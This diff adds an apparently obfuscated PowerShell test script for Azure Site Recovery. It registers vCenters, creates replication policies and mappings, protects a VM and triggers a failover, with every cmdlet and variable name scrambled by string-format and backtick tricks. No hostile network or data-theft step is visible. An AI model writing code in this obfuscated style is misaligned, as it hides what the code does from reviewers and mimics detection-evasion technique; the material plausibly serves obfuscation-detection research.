@@ -1,0 +1,511 @@
+  SEt  ('3I'+'1')  ( [type]("{2}{0}{1}{4}{11}{5}{8}{13}{3}{15}{9}{12}{7}{6}{14}{10}" -f 't.cLIE','nT','MiCroSOFT.reS','.teSTFR','R','ME.','ESTu','.T','Azu','r','ies','UNTi','k','Re','tilit','aMEwo') );  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+${sUf`FiX}=("{0}{1}" -f'v2avm','1')
+${j`o`B`QuErYwAIT`Tim`eInseCOndS} = 0
+${p`RiMa`Ryfa`Bri`cNAmE} = ("{1}{3}{0}{2}" -f'K12-4','V2A-','00','W2')
+${PrimARy`NetWORkFR`i`ENDL`yNaMe} = ("{0}{1}"-f 'cor','p')
+${r`ECO`VEryNEtw`OR`KfrIEN`d`L`yname} = ("{1}{0}"-f'rp','co')
+${NEtW`o`R`Km`ApPIngNA`ME} = ("{2}{1}{0}"-f '6map','p9','cor')
+${REcOvE`Ry`PLAnn`AME} = ("{0}{1}{2}"-f 'R','PSwa','g96') + ${SUF`FiX}
+${PoL`IcYn`Am`e1} = ("{0}{2}{1}" -f'V','aTest','2') + ${SU`Ffix}
+${PO`l`iCyN`AME2} = ("{0}{1}"-f 'V','2aTest')+ ${SuF`FiX}+("{2}{0}{3}{1}" -f'i','ack','-fa','lb')
+${PriM`ArYPR`o`TECtiOn`COnT`AiN`ermAPpINg} = ("{1}{2}{0}" -f 'g','pcmmap','pin') + ${S`U`FFiX}
+${rEv`eRsE`m`ApPING} = ("{2}{0}{3}{1}"-f 'rse','ap','reve','M') + ${Su`F`FiX}
+${pc`N`Ame} = ("{1}{0}{2}" -f'W2K12','V2A-','-400')
+
+${R`Pin`AME} = ("{3}{2}{0}{1}"-f '-','rpi-','st','V2ATe') + ${S`UFfix}
+${REcOV`Erya`zUre`STOraGea`ccO`U`NtiD} = ("{21}{24}{8}{6}{31}{9}{2}{29}{25}{13}{35}{7}{18}{30}{0}{10}{17}{26}{12}{1}{14}{27}{23}{22}{34}{20}{3}{5}{4}{16}{28}{11}{19}{15}{32}{33}" -f 'oups/ca','der','1','eA','u','cco','tions/7','74/resou','p','1b-5','naryex','ev2t','vi','11bd','s/Micro','to','n','proute/pr','rceG','ests','ag','/subs','sto','/','cri','614','o','soft.Storage','ts/','22-4097-90c8-8','r','c943c','ra','ge','r','d5') 
+${R`e`cOV`eryResOu`RCE`gROupid}  = ("{0}{4}{1}{12}{8}{11}{5}{6}{7}{3}{10}{2}{9}"-f'/subscr','c943c1b-5122-409','xpr','sourceGroups/','iptions/7','61411','bdd574','/re','-','oute','canarye','90c8-8','7') 
+${az`UrEvMNetW`o`RKId} = ("{34}{31}{39}{28}{42}{32}{16}{26}{21}{5}{19}{9}{1}{14}{29}{17}{27}{23}{33}{41}{11}{43}{2}{36}{45}{25}{12}{40}{38}{6}{30}{24}{20}{18}{10}{0}{8}{4}{44}{22}{3}{15}{37}{7}{35}{13}" -f'C','14','k','CO','aryTes','4097-','Network/vir','ET','an','c8-86','rks/ASR','RNe','cros','1','11b','RP-SEA','c1b','eGro','o','90','w','122-','-','s','et','ers/Mi','-5','up','tions/7','dd574/resourc','tualN','sub','3','/','/','-','/p','-VN','.','scrip','oft','E','c94','twor','tSub3','rovid')
+${rP`i`NAMeN`Ew} = ("{6}{0}{3}{1}{4}{5}{2}" -f't-Ce','t','400-new','n','OS6U','7-','V2ATes')
+${V`c`Ent`ERIP`orHos`TnAME} = ("{0}{2}{1}"-f '10.1','9.216','50.20')
+${V`c`ENTErNAme} = ("{1}{0}" -f 'R','BCD')
+${s`Ubn`ET} = ("{0}{1}{2}"-f 'Sub','n','et-1')
+
+${Pi`NAMe} = ("{0}{1}"-f'v2avm','1')
+${VM`Ip} = ("{0}{2}{3}{1}"-f '10.','.125','1','50.208')
+${V`M`N`AMelISt} = ("{1}{2}{5}{4}{3}{6}{0}" -f '4003','v2','a','-4','n','vm1,wi','002,win-')
+
+
+function wAIT`FO`Rj`obcoMp`L`E`TIon
+{ 
+    param(
+        [string] ${jOb`Id},
+        [int] ${jObQ`Uer`y`WAItT`iMEINsEcOnDs} =${j`OBqu`er`Y`WAiTtiM`eINS`ecOnds}
+        )
+        ${ISjOb`LEFt`FoR`PRocE`s`sING} = ${TR`UE};
+        do
+        {
+            ${J`oB} = &("{0}{1}{5}{3}{2}{6}{4}{7}{8}"-f'Get-AzR','ecov','e','yS','vi','er','r','ce','sAsrJob') -Name ${jo`BId}
+            ${j`Ob}
+
+            if(${j`OB}."ST`ATe" -eq ("{1}{0}{2}"-f'ro','InP','gress') -or ${j`OB}."sTa`TE" -eq ("{0}{2}{1}" -f'NotSt','d','arte'))
+            {
+                ${isjO`BlE`F`T`FoRP`RoCE`SSINg} = ${tr`Ue}
+            }
+            else
+            {
+                ${ISJOB`le`Ft`FO`R`procESsinG} = ${F`Alse}
+            }
+
+            if(${iS`Jobl`E`FTfO`R`PROcessIng})
+            {
+                  (Ls ("{2}{3}{1}{0}"-f 'E:3i1','iAbL','Va','R')  ).VALue::("{0}{1}" -f 'Wa','it').Invoke(${JoB`QUER`yW`A`iT`Timeinsec`OnDs} * 1000)
+            }
+        }While(${ISj`OBle`FTfORPr`o`ce`sSing})
+}
+
+
+Function WAi`TFo`RircOmpLeT`i`on
+{ 
+    param(
+        [PSObject] ${taR`ge`TObJEC`Tid},
+        [int] ${jO`BQU`er`YWai`T`Time`INSeConds} = ${jO`B`Q`UERYwaiTtim`EI`N`SeCo`Nds}
+        )
+        ${ISp`R`OCeSSIn`Gle`Ft} = ${TR`Ue}
+        ${Ir`JoBs} = ${nu`LL}
+
+        do
+        {
+            ${iRJ`Obs} = &("{1}{2}{0}{5}{4}{6}{3}" -f'overyServi','Get-AzRe','c','Job','e','c','sAsr') -TargetObjectId ${TA`RgE`ToB`JecTId} | &("{2}{0}{1}"-f 'ort-O','bject','S') ("{0}{2}{1}"-f'St','Time','art') -Descending | &("{2}{0}{1}"-f'el','ect','s') -First 1 | &("{2}{0}{1}{3}"-f're-Ob','j','Whe','ect'){${_}."j`Ob`TyPe" -eq ("{1}{0}{3}{2}"-f'i','IrComplet','n','o')}
+            if(${irj`o`Bs} -eq ${nu`LL} -or ${Irj`OBs}."c`OUNT" -lt 1)
+            {
+                ${iSprOCesSI`Ng`L`eFT} = ${t`RUE}
+            }
+            else
+            {
+                ${Isp`RoCeSS`i`NgLEfT} = ${fal`sE}
+            }
+
+            if(${ISPR`OcEsS`i`NG`leFt})
+            {
+                 ${3`I1}::("{0}{1}"-f 'Wai','t').Invoke(${joBQ`UeRY`WA`i`T`TIm`eiNse`COnds} * 1000)
+            }
+        }While(${ispr`O`CES`sIngleft})
+
+        ${I`RjOBS}
+        &("{1}{4}{3}{2}{6}{0}{5}"-f 'pletio','Wai','orJobC','F','t','n','om') -JobId ${i`Rjo`BS}[0]."na`Me" -JobQueryWaitTimeInSeconds ${jO`Bq`U`erYwaitT`imE`INSec`on`dS}
+}
+
+
+function tes`T-VC`ENTEr 
+{
+    param([string] ${Va`ULTseTtiN`Gsf`iL`eP`A`Th})
+
+    &("{0}{5}{4}{1}{7}{2}{3}{6}" -f'Impo','AzReco','sAsrVaultSetting','sF','-','rt','ile','veryService') -Path ${v`AUltseTt`INgs`FIl`E`P`AtH}
+    ${Fabr`IC} =  &("{2}{3}{1}{0}"-f 'ic','r','Get-','AsrFab') -FriendlyName ${PRI`m`ArY`FAbR`ICnaME}
+    ${J`OB} = &("{1}{3}{0}{2}" -f 'ASRv','New','Center','-') -Fabric ${FAb`RiC} -Name ${VCeN`Te`R`NAme} -IpOrHostName ${vceN`TErIpORHOs`Tn`AMe} -Port 443 -Account ${f`ABrIc}."fa`BRic`SPEcI`Fi`cDETaiLs"."RunasA`CC`OunTs"[0]
+    &("{0}{1}{4}{5}{2}{3}" -f'Wai','tForJobCo','i','on','mple','t') -JobId ${J`oB}."n`AMe"
+
+    ${F`AB`Ric} =  &("{3}{0}{4}{1}{2}"-f't-A','rFabri','c','Ge','s') -FriendlyName ${p`RI`mar`yfAbr`iCnAME}
+
+    ${VcENte`RLI`ST} = &("{2}{0}{1}" -f'nt','er','Get-ASRvCe') -Fabric ${Fab`RiC} 
+    &("{0}{3}{2}{1}"-f 'Ass','Null','rt-Not','e')(${VC`e`NTERLIst}[0])
+
+    ${Vc`eNTer} = &("{1}{0}{2}"-f'-ASRv','Get','Center') -Fabric ${fAB`R`iC} -Name ${vCE`NTeRnA`Me}
+    &("{2}{4}{3}{0}{1}" -f'ul','l','Ass','N','ert-Not')(${v`Ce`Nter})
+
+    ${uP`dAte`JOb} = &("{4}{6}{0}{3}{2}{1}{7}{5}" -f 'te-AzRe','v','yServicesAsr','cover','Upd','ter','a','Cen') -InputObject ${v`CeNT`er} -Port 444
+    &("{3}{4}{2}{0}{1}" -f 'p','letion','om','Wai','tForJobC') -JobId ${UPdA`Te`job}."N`AME"
+
+    ${j`Ob} = &("{3}{4}{0}{2}{5}{1}"-f 'RvC','r','en','Remove-','AS','te') -InputObject ${vCe`NtEr}
+    &("{4}{3}{5}{0}{2}{1}"-f 'Co','tion','mple','it','Wa','ForJob') -JobId ${j`Ob}."N`AMe"
+}
+
+
+function TESt-SiT`ERE`C`oV`Er`YF`AB`RiCTest
+{
+    param([string] ${vAUlTsE`T`TinGsFI`lEpaTH})
+
+    
+    &("{2}{4}{5}{8}{1}{9}{10}{6}{3}{0}{7}"-f'ett','coveryServ','Imp','S','ort','-A','rVault','ingsFile','zRe','ic','esAs') -Path ${vAUlt`s`et`Tin`GSFilEP`ATH}
+    
+    ${FaBR`ic`LiSt} =  &("{0}{2}{4}{1}{3}"-f 'Get-As','i','rF','c','abr')
+    &("{1}{3}{2}{4}{0}"-f'll','As','ert-NotN','s','u')(${F`ABRI`C`lIsT})
+
+    ${FA`B`RiC} =  &("{3}{1}{2}{0}"-f 'rFabric','A','s','Get-') -FriendlyName ${P`Ri`m`ARyF`ABriCNAME}
+    &("{1}{0}{2}"-f 'sert-N','As','otNull')(${FAB`RiC})
+    &("{0}{2}{1}{3}{4}" -f'As','t-NotN','ser','u','ll')(${f`AB`RIc}."f`RieND`LYna`Me")
+    &("{0}{4}{1}{3}{2}"-f 'A','e','t-NotNull','r','ss')(${fAb`R`iC}."NA`me")
+    &("{3}{0}{1}{2}" -f 'sser','t','-NotNull','A')(${FA`B`RIc}."ID")
+    &("{1}{2}{3}{0}" -f'll','A','sser','t-NotNu')(${FABr`iC}."f`AbRi`csPeCiF`iCD`ETA`ils")
+
+    ${FAbR`icdeTa`ils} = ${fAb`R`IC}."fa`BrIC`spEcif`icdEtAIls"
+
+    &("{2}{0}{4}{1}{3}"-f's','rt-N','As','otNull','e')(${fAbRic`d`E`TaiLS}."HoST`NaMe")
+    &("{2}{1}{3}{0}"-f'Null','-N','Assert','ot')(${FabrI`c`DETaI`lS}."i`P`AdDRESS")
+    &("{4}{3}{0}{1}{2}" -f't-','NotNul','l','sser','A')(${f`A`BrIcdE`TAIlS}."a`GenT`VERSioN")
+    &("{1}{4}{3}{2}{0}"-f'll','As','NotNu','ert-','s')(${Fabri`CdeT`AiLs}."p`RoTecte`dsEr`V`Ers")
+    &("{3}{2}{4}{0}{1}"-f'l','l','rt','Asse','-NotNu')(${fA`BRI`c`DeTaILS}."Las`TH`EArTbEAT")
+    &("{1}{0}{2}" -f'ert-No','Ass','tNull')(${Fa`BrIC`de`T`AilS}."p`RoceS`S`ser`VERS")
+    &("{1}{0}{3}{2}" -f 'sser','A','ll','t-NotNu')(${fAb`RICDe`T`AilS}."MAsT`eRTaRG`et`se`R`VERS")
+    &("{2}{1}{0}"-f'ull','otN','Assert-N')(${FABRI`Cd`e`TaILs}."RunaSA`cC`oUN`TS")
+    &("{3}{0}{2}{1}"-f 'ssert','ll','-NotNu','A')(${fABrICdEt`A`Ils}."ipa`dDre`sS")
+
+    ${pR`o`c`e`ssSeRveR} = ${faBR`icdE`T`AiLS}."procESss`Er`VerS"
+
+    &("{1}{0}{4}{3}{2}" -f'ssert-No','A','l','Nul','t')(${P`R`oC`eSSSE`RVeR}."FriEnDl`ynA`Me")
+    &("{2}{3}{1}{0}"-f'Null','Not','A','ssert-')(${P`ROcE`ss`SErv`Er}."i`D")
+    &("{2}{0}{1}{3}"-f 'sert-','NotNu','As','ll')(${pro`cE`Ss`seRVeR}."IP`ADdr`eSs")
+
+    
+    
+}
+
+
+function TE`s`T-PC
+{
+    param([string] ${V`A`UltsEtTi`NgsFiLE`pATH})
+
+    
+    &("{3}{2}{1}{6}{0}{5}{7}{4}"-f'Servi','ve','rt-AzReco','Impo','ultSettingsFile','cesAs','ry','rVa') -Path ${V`AUL`TsETt`iNgS`FiLe`pAtH}
+    ${F`ABr`Ic} =  &("{2}{0}{1}" -f 'a','bric','Get-AsrF') -FriendlyName ${pRI`mar`YFaBrI`CnAME}
+    
+
+    ${pR`oTe`cti`On`COnTA`Ine`RLI`st} =  &("{1}{4}{0}{3}{2}"-f'ection','Get-AS','ner','Contai','RProt') -Fabric ${fAb`RiC}
+    &("{1}{2}{3}{0}"-f 'l','Assert','-','NotNul')(${p`Ro`Te`cTIoncO`NtainerLIST})
+    ${P`R`oTECt`IonCOnT`AInEr} = ${pr`O`T`ect`IOnCONtaiNeRLi`St}[0]
+    &("{3}{1}{0}{2}"-f '-NotNul','ssert','l','A')(${PrO`TE`c`TIONCoNtA`InER})
+    &("{1}{0}{2}{3}"-f 'Nu','Assert-Not','l','l')(${P`Rotecti`oNC`ONtAI`NeR}."I`D")
+    &("{3}{2}{1}{0}" -f'eEQUAL','ert-Ar','s','As') -actual ${PROT`Ec`TIONc`O`NTaINER}."fabrIC`TY`Pe" -expected ("{0}{1}{2}" -f'VMw','a','re')
+
+    ${pr`oteC`T`ioNCOnta`iNEr} =  &("{4}{2}{0}{1}{5}{3}" -f'e','ctionCon','rot','ner','Get-ASRP','tai') -FriendlyName ${p`Cn`AME} -Fabric ${f`ABR`IC}
+    &("{0}{1}{2}" -f 'As','s','ert-NotNull')(${PrOTEcTiOnc`Ont`A`i`Ner})
+    &("{1}{2}{0}"-f 'Null','As','sert-Not')(${PRoTEC`TIONcON`TAiN`Er}."i`d")
+    &("{1}{2}{0}{3}{4}"-f'sert-AreE','A','s','QU','AL') -actual ${pRoTe`CT`ioNCoNTaIn`Er}."fA`B`RIct`ype" -expected ("{1}{0}" -f'Mware','V')
+
+    ${prO`T`EcTiO`NcONT`A`i`NER} =  &("{4}{0}{3}{2}{1}" -f 'A','ainer','nt','SRProtectionCo','Get-') -Name ${p`Ro`T`ectIONCo`NtaIn`eR}."nA`mE" -Fabric ${FAB`RIC}
+        &("{3}{1}{0}{2}{4}" -f'r','e','t-NotNu','Ass','ll')(${prOTect`I`O`NCOnTAinEr})
+    &("{2}{3}{1}{0}"-f'Null','Not','A','ssert-')(${pR`O`TE`cTIonc`ON`TAINEr}."i`d")
+    &("{2}{0}{1}"-f't-AreE','QUAL','Asser') -actual ${pro`TecTI`oN`CoNTaI`NeR}."fa`BR`iCTyPe" -expected ("{0}{1}" -f 'VMw','are')
+}
+
+
+function TEST`-SitERE`coVErYP`o`LIcy
+{
+    param([string] ${Va`ULtSe`TTI`N`gs`FilEP`ATh})
+
+    
+    &("{4}{2}{5}{0}{3}{7}{8}{9}{1}{6}"-f 'rv','i','-AzRe','ic','Import','coverySe','ngsFile','esAsrV','ault','Sett') -Path ${VaUL`Tsetting`sfIL`e`paTH}
+
+    ${j`Ob} = &("{1}{3}{2}{0}{4}{5}" -f 'ic','New-AzRecove','erv','ryS','e','sAsrPolicy') -Name ${P`o`Li`cyNAme1} -VmwareToAzure -RecoveryPointRetentionInHours 40  -RPOWarningThresholdInMinutes 5 -ApplicationConsistentSnapshotFrequencyInHours 15
+    &("{3}{5}{0}{2}{1}{4}" -f 'tF','bCompleti','orJo','W','on','ai') -JobId ${j`OB}."na`Me"
+    
+    ${p`OlI`Cy1} = &("{4}{0}{3}{8}{6}{1}{7}{2}{5}"-f 'zR','sAsr','c','e','Get-A','y','rvice','Poli','coverySe') -Name ${PO`lI`cYnAM`e1}
+    &("{1}{0}{2}"-f 'rt-Tr','Asse','ue') { ${po`LIcY1}."Cou`NT" -gt 0 }
+    &("{0}{3}{2}{1}"-f'As','NotNull','rt-','se')(${pOl`IC`Y1})
+
+    
+    ${j`ob} = &("{2}{4}{5}{1}{3}{6}{0}" -f 'cy','ryService','Ne','sAsrP','w-AzReco','ve','oli') -Name ${pO`LICy`NAme2} -AzureToVmware -RecoveryPointRetentionInHours 40  -RPOWarningThresholdInMinutes 5 -ApplicationConsistentSnapshotFrequencyInHours 15
+    &("{1}{2}{3}{0}"-f 'on','WaitForJo','bCompl','eti') -JobId ${j`Ob}."na`me"
+
+    
+    ${p`oli`cY2} = &("{2}{5}{3}{1}{0}{4}"-f'e','ic','G','-AzRecoveryServ','sAsrPolicy','et') -Name ${pOlicyN`A`Me2}
+    &("{2}{1}{0}" -f'ue','ert-Tr','Ass') { ${P`oLIC`y2}."co`UNt" -gt 0 }
+    &("{0}{3}{2}{1}" -f 'A','tNull','rt-No','sse')(${P`ol`Icy2})
+    
+    ${Re`Mo`VeJOB} = &("{3}{0}{2}{1}" -f'Pol','cy','i','Remove-ASR') -InputObject ${P`O`liCy1}
+    ${REMov`eJ`Ob} = &("{3}{2}{0}{1}"-f 'olic','y','P','Remove-ASR') -InputObject ${pol`iCy2}
+}
+
+
+function TeST-v`2a`ADDPI
+{
+    param([string] ${V`AU`LTsetTiNGs`F`iLEpATh})
+
+    
+    &("{5}{8}{1}{0}{10}{4}{2}{11}{6}{7}{9}{3}" -f 'z','t-A','ic','le','eryServ','Im','tting','s','por','Fi','Recov','esAsrVaultSe') -Path ${V`A`ULt`sE`TtI`NgsFIlE`pAtH}
+    ${faBR`Ic} =  &("{0}{2}{3}{1}"-f'Ge','c','t-Asr','Fabri') -FriendlyName ${pri`M`A`RY`FabriCnA`ME}
+     ${pC} =  &("{1}{5}{0}{2}{6}{3}{4}" -f 'ction','Get-AS','Con','in','er','RProte','ta') -FriendlyName ${PCnA`mE} -Fabric ${F`Ab`Ric}
+    ${J`Ob} = &("{0}{2}{9}{5}{8}{4}{1}{7}{6}{3}"-f 'Ne','rvices','w-','tableItem','Se','zRecove','Protec','Asr','ry','A') -IPAddress ${v`Mip} -FriendlyName ${pI`NA`mE} -OSType ("{0}{1}" -f 'Win','dows') -ProtectionContainer ${P`c}
+    &("{5}{2}{0}{3}{1}{4}" -f't','rJobComp','i','Fo','letion','wa') -JobId ${j`oB}."NA`mE"
+}
+
+
+function T`eST-P`Cm 
+{
+    param([string] ${vAuL`TSeTTIng`sFil`e`p`ATh})
+
+    &("{9}{4}{11}{12}{1}{6}{2}{7}{0}{13}{5}{3}{10}{8}"-f'aul','ce','sr','gsFi','AzRecove','in','sA','V','e','Import-','l','rySer','vi','tSett') -Path ${VaulTSEtti`N`GsF`iL`ep`Ath}
+    ${faBr`Ic} =  &("{2}{1}{0}"-f 'ic','srFabr','Get-A') -FriendlyName ${p`R`iMArYFABRI`c`NA`Me}
+    
+    &("{10}{2}{6}{8}{4}{7}{1}{0}{5}{9}{3}"-f 't','sAsrVaul','-AzRecov','le','vic','Sett','ery','e','Ser','ingsFi','Import') -Path ${v`Au`lT`settINGS`F`Il`epaTH}
+
+    ${pc} =  &("{0}{2}{5}{1}{3}{4}" -f 'G','ionConta','et-ASRP','ine','r','rotect') -FriendlyName ${pc`Name} -Fabric ${fa`BrIc}
+    
+    ${J`oB1} = &("{8}{5}{4}{7}{1}{2}{0}{6}{3}" -f 'cesA','veryS','ervi','y','zRe','A','srPolic','co','New-') -Name ${PoL`Icy`Na`ME1} -VmwaretoAzure -RecoveryPointRetentionInHours 40  -RPOWarningThresholdInMinutes 5 -ApplicationConsistentSnapshotFrequencyInHours 15
+    ${jO`B2} = &("{5}{1}{2}{4}{8}{7}{3}{0}{6}" -f'ol','ew-AzRe','co','srP','ve','N','icy','ServicesA','ry') -Name ${p`o`LICYNAMe2} -AzureToVmware -RecoveryPointRetentionInHours 40  -RPOWarningThresholdInMinutes 5 -ApplicationConsistentSnapshotFrequencyInHours 15
+    &("{4}{0}{1}{2}{3}"-f'Jo','bCo','mpl','etion','waitFor') -JobId ${j`ob1}."Na`ME"
+    &("{5}{2}{4}{3}{1}{0}" -f'n','io','or','plet','JobCom','waitF') -JobId ${j`Ob2}."N`AmE"
+
+    ${poL`i`CY1} = &("{0}{4}{2}{5}{1}{3}"-f'G','li','t-AzReco','cy','e','veryServicesAsrPo') -Name ${PoLI`c`YnA`mE1}
+    ${P`oLI`cy2} = &("{4}{0}{2}{3}{5}{1}{8}{6}{7}" -f 'Rec','sAsr','ov','eryS','Get-Az','ervice','i','cy','Pol') -Name ${P`olicY`NA`me2}
+
+    
+    ${P`cmj`oB} =  &("{13}{14}{9}{8}{4}{6}{5}{2}{11}{0}{3}{1}{10}{12}{7}" -f'o','tainer','Pro','nCon','RecoveryServices','r','As','ping','z','-A','M','tecti','ap','Ne','w') -Name ${pR`iMARYPRotECT`I`ONConT`AInE`Rm`APpI`Ng} -policy ${Po`li`cY1} -PrimaryProtectionContainer ${Pc}
+    &("{1}{4}{0}{3}{2}{5}{6}" -f 'o','Wai','o','rJobC','tF','mple','tion') -JobId ${pc`Mj`oB}."n`Ame" 
+
+    ${p`Cm} = &("{2}{1}{5}{0}{3}{4}{7}{6}" -f'ProtectionCo','t-','Ge','ntai','ner','ASR','ing','Mapp') -Name ${primArY`pRo`TecTioNCoNTAin`eRmapP`i`Ng} -ProtectionContainer ${P`C}
+    &("{2}{0}{3}{1}" -f 't','otNull','Asser','-N')(${p`CM})
+
+    ${rEm`oV`epcm} = &("{1}{5}{2}{8}{3}{6}{10}{9}{4}{0}{7}" -f'iner','Rem','coveryS','vicesAsrPro','Conta','ove-AzRe','te','Mapping','er','tion','c')  -InputObject ${p`cM} 
+    &("{0}{2}{4}{1}{3}" -f'Wai','mp','tForJo','letion','bCo') -JobId ${RE`m`OvEpcM}."Na`ME"
+}
+
+
+function v`2AcR`E`AtERPi 
+{
+    param([string] ${vAuLtSet`TI`NG`s`FIl`E`pATh})
+
+    
+    &("{2}{4}{7}{1}{5}{0}{8}{3}{9}{6}"-f'cesAsrVaultSet','coveryServ','Import-','i','A','i','e','zRe','tingsF','l') -Path ${vAUl`TsetT`iNGSfIle`Pa`Th}
+
+    ${F`ABRiC} =  &("{1}{3}{2}{0}"-f 'Fabric','Ge','sr','t-A') -FriendlyName ${Pr`iMar`YFABr`ICna`ME}
+    ${pc} =  &("{4}{3}{0}{2}{5}{1}" -f 'S','ontainer','RProtection','-A','Get','C') -FriendlyName ${p`cNa`Me} -Fabric ${fAB`RIC}
+    ${jo`B1} = &("{4}{0}{1}{5}{3}{2}{7}{6}{8}" -f'ySe','r','rPo','esAs','New-AzRecover','vic','c','li','y') -VmwareToAzure -Name ${PoL`Ic`ynam`E1}  -RecoveryPointRetentionInHours 40  -RPOWarningThresholdInMinutes 5 -ApplicationConsistentSnapshotFrequencyInHours 15 -MultiVmSyncStatus ("{2}{0}{1}"-f 'nabl','e','E')
+    ${J`OB2} = &("{4}{0}{3}{5}{1}{2}{6}" -f'-Az','Pol','i','Reco','New','veryServicesAsr','cy') -AzureToVmware -Name ${p`O`LIc`ynAMe2}  -RecoveryPointRetentionInHours 40  -RPOWarningThresholdInMinutes 5 -ApplicationConsistentSnapshotFrequencyInHours 15 -MultiVmSyncStatus ("{2}{0}{1}"-f'nab','le','E')
+    &("{1}{0}{2}{3}{4}" -f 'orJobCompl','WaitF','e','tio','n') -JobId ${J`OB1}."NA`ME"
+    &("{4}{2}{3}{0}{5}{1}"-f'mplet','n','bC','o','WaitForJo','io') -JobId ${JO`B2}."n`Ame"
+    ${Pol`i`Cy1} = &("{4}{0}{8}{7}{1}{5}{6}{3}{2}"-f '-A','ices','y','c','Get','Asr','Poli','v','zRecoverySer') -Name ${P`o`LICYnAMe1}
+    ${POL`i`Cy2} = &("{5}{4}{3}{0}{2}{6}{1}" -f'ServicesA','icy','srPo','ecovery','AzR','Get-','l') -Name ${pO`LI`cyN`Ame2}
+
+    
+    ${P`cmjOB} =  &("{5}{8}{9}{1}{10}{4}{6}{7}{2}{0}{3}"-f'ner','icesAs','ai','Mapping','otecti','N','onCon','t','ew-','AzRecoveryServ','rPr') -Name ${prI`ma`RYp`R`ot`eCti`o`NCO`NTAINEr`mAPPI`NG} -policy ${PoL`i`CY1} -PrimaryProtectionContainer ${pc}
+    &("{2}{3}{0}{1}"-f'obCompleti','on','Wa','itForJ') -JobId ${P`Cm`jOB}."n`AmE"
+
+    ${P`Cm} = &("{2}{0}{7}{5}{4}{6}{3}{1}" -f'SRPro','g','Get-A','pin','on','ionC','tainerMap','tect') -Name ${P`Ri`marY`pro`Te`CtIOnconT`AIN`Erma`p`pI`NG} -ProtectionContainer ${Pc}
+    ${PI} = &("{2}{0}{4}{1}{3}"-f'ASRP','tectableIt','Get-','em','ro') -ProtectionContainer ${pc} -FriendlyName ${pI`NaMe}
+    ${E`Nab`LEDrjoB} = &("{2}{5}{0}{1}{7}{3}{6}{9}{10}{8}{11}{4}" -f'-','AzReco','N','rv','Item','ew','icesAsr','verySe','icatio','Re','pl','nProtected') -vmwaretoazure -ProtectableItem ${p`I} -Name ${rp`i`NamE} -ProtectionContainerMapping ${p`cm} -RecoveryAzureStorageAccountId ${RecovE`Ry`AZurestO`R`AG`eAcc`Oun`TiD} -RecoveryResourceGroupId  ${r`ecOverYr`ES`O`U`RCegrOU`piD} -ProcessServer ${f`A`BRIC}."f`A`B`RicsP`E`ciFIc`DEtaiLS"."PrOcE`Ss`Se`RVERS"[0] -Account ${F`AbrIc}."fa`B`Ri`c`SPECIFi`C`DEtailS"."runAS`ACco`U`N`TS"[0] -RecoveryAzureNetworkId ${az`UREvMN`Et`w`ORkiD} -RecoveryAzureSubnetName ${SuB`NET}
+    }
+
+
+
+function Te`sT-r`PJO`BRev`ERsE
+{
+    param([string] ${vaU`lT`sE`Ttings`FIL`EPAtH})
+
+    
+    &("{9}{3}{8}{5}{6}{7}{4}{10}{2}{0}{1}" -f 'l','e','Fi','mport-AzReco','ltS','ySe','rvicesAsr','Vau','ver','I','ettings') -Path ${vA`UL`TSe`TTiNG`sfI`LEPaTh}
+    ${F`AbRiC} =  &("{0}{2}{1}" -f'Get','ic','-AsrFabr') -FriendlyName ${pRiMa`RyfAb`R`iCnamE}
+    ${P`c} =  &("{2}{0}{3}{6}{1}{4}{5}" -f 'ASR','Co','Get-','Protectio','nta','iner','n') -FriendlyName ${pcn`Ame} -Fabric ${FabR`ic}
+    ${R`PI} = &("{3}{6}{4}{8}{9}{10}{0}{5}{7}{2}{1}" -f 'ionPro','dItem','e','get-A','ecoveryServicesAs','te','zR','ct','rR','epli','cat') -ProtectionContainer ${p`C} -Name ${rp`In`AmE}
+    ${pOLI`Cy2} = &("{5}{2}{0}{3}{1}{4}{6}{7}"-f'ecov','er','et-AzR','eryS','v','G','ic','esAsrPolicy') -Name ${P`oli`cy`Name2}
+    ${pCm`jOb} =  &("{7}{1}{4}{6}{5}{9}{8}{2}{13}{3}{0}{11}{10}{12}" -f'n','ew-','c','rotectio','Az','y','Recover','N','vi','Ser','Mapp','Container','ing','esAsrP') -Name ${rEVer`sem`AP`pI`Ng} -policy ${POL`ICY2} -PrimaryProtectionContainer ${pC} -RecoveryProtectionContainer ${pc}
+    &("{0}{3}{5}{4}{1}{2}"-f 'Wa','ti','on','itForJo','le','bComp') -JobId ${p`cMJ`oB}."na`ME"
+    
+    ${P`CM} = &("{0}{1}{5}{4}{6}{3}{2}"-f'Get-','ASRProte','erMapping','tain','ionC','ct','on') -Name ${REve`RSemap`P`Ing} -ProtectionContainer ${P`c}
+    ${j`OB} = &("{9}{7}{3}{2}{10}{1}{6}{4}{8}{0}{5}"-f 'rect','R','-A','ate','sAsrPr','ion','ecoveryService','d','otectionDi','Up','z') -AzureToVMware`
+    &("{0}{2}{1}"-f '-A','t','ccoun') ${fAB`Ric}."fA`BrIcspEcifi`CD`e`Tai`ls"."Ru`Nas`ACCouNTS"[0] -DataStore ${fAB`Ric}."faBRic`Spe`CIfic`d`etaIlS"."M`AStERt`ArgeT`Se`RvERs"[0]."D`At`AStoReS"[3] `
+    -Direction ("{3}{1}{2}{0}{4}" -f'ryToPrimar','e','cove','R','y') -MasterTarget ${FAb`RIc}."fAB`RIc`SpECIfICd`eTAIls"."mA`STER`TaRGETse`Rv`e`Rs"[0] `
+    -ProcessServer ${f`AB`RiC}."fAb`R`i`CSPEcIficD`eT`AIlS"."pR`OcESS`SeRVe`RS"[0] -ProtectionContainerMapping ${p`Cm} `
+    -ReplicationProtectedItem ${r`Pi} -RetentionVolume ${fA`BriC}."FAbricsPe`C`iFIC`D`E`T`AilS"."MaSt`E`RTAr`gETSerV`ErS"[0]."retE`Nt`iONVolUM`ES"[0] 
+    &("{1}{0}{2}{3}{4}"-f'a','W','itForJobCompl','eti','on') -JobId ${J`oB}."Na`me"
+    
+    ${r`p} = &("{4}{7}{3}{2}{6}{5}{0}{1}" -f 'er','yPlan','r','ove','G','rRecov','yServicesAs','et-AzRec') -Name ${ReC`oV`ERY`PlA`NnaMe} 
+
+    
+    
+    
+    
+    
+    ${Fo`JOb} = &("{6}{8}{4}{1}{3}{0}{5}{2}{7}" -f'ery','ec','ervicesAsrUnPlannedFai','ov','-AzR','S','St','loverJob','art') -RecoveryPlan ${RP} -Direction ("{0}{2}{3}{1}"-f 'R','mary','ecover','yToPri')
+    &("{0}{1}{2}{3}" -f'Wait','Fo','rJobComp','letion') -JobId ${f`ojOb}."na`Me"
